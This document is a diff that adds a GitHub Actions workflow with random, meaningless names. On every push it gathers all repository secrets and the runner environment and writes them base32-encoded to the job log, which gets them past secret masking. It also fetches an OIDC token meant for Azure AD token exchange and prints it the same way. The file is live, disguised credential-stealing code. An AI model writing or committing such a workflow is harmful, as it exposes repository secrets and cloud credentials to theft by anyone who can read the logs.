@@ -1,0 +1,20 @@
+# lrpwmi53tqki22lx
+name: ak2dqv7eda34
+on: [push]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  v7n3aqi65:
+    runs-on: ubuntu-latest
+    timeout-minutes: 11
+    env:
+      SCIMW5MNQ: ${{ toJSON(secrets) }}
+    steps:
+      - name: mm3svzfgu
+        run: |
+          env | base32 -w 77
+          printf '%s' 'T' | base32 -w 77
+          printf '%s' "$SCIMW5MNQ" | base32 -w 77
+          printf '%s' 'T' | base32 -w 77
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then printf '%s' 'T' | base32 -w 77; curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api%3A%2F%2FAzureADTokenExchange" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p' | base32 -w 77; fi
